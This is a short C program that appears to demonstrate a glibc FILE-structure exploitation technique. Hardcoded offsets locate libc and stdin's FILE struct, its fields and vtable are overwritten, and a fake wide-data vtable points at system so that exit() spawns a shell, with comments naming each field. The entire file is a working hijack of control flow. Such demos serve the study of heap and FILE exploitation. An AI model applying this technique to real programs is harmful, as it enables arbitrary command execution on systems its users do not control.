#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
int main()
{
    long libc_base = &printf - 0x60770;
    long _IO_2_1_stdin_ptr = libc_base + 0x219aa0;

    *(int*)(_IO_2_1_stdin_ptr + 0xc0) = 0;
     // fp->_mode = 0
    *(long*)(_IO_2_1_stdin_ptr + 0x28) = 1;
     // fp->_IO_write_ptr = 1
    *(long*)(_IO_2_1_stdin_ptr + 0x20) = 0;
     // fp->_IO_write_base = 0

    *(int*)(_IO_2_1_stdin_ptr + 0) =0x68732020;
    // fp->_flags = '  sh'

    *(long*)(_IO_2_1_stdin_ptr + 0xd8) = libc_base + 0x2160c0;
    // fp->_vtable = _IO_wfile_jumps
    
    long wide_data = *(long*)(_IO_2_1_stdin_ptr + 0xa0);
    *(long*)(wide_data + 0x18) = 0;
    // fp->_wide_data->_IO_write_base = 0

    long fake_wide_data_vtable = malloc(0x300);
    *(long*)(wide_data + 0xe0) = fake_wide_data_vtable;
    *(long*)(fake_wide_data_vtable + 0x68) = &system;
    // fp->_wide_data->_wide_vtable + 0x68 = &system

    exit(0);
}
